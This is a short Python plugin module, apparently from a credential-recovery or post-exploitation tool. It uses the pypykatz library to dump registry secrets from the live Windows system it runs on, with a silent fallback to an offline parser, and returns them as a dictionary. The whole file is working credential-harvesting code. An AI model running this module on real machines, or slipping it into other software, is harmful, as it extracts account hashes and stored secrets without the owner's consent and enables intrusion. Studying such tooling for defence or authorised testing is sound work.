# -*- coding: utf-8 -*-
from pypykatz.registry.live_parser import LiveRegistry


class RegistrySecrets:
    def run(self, profile):
        if profile.get('registry_secrets'):
            return profile['registry_secrets']

        lr = {}
        try:
            lr = LiveRegistry.go_live()
        except Exception as e:
            try:
                from pypykatz.registry.offline_parser import OffineRegistry
                lr = OffineRegistry.from_live_system()
            except Exception as e:
                pass

        if lr:
            lr = lr.to_dict()

        return lr


modules = {"RegistrySecrets": RegistrySecrets()}
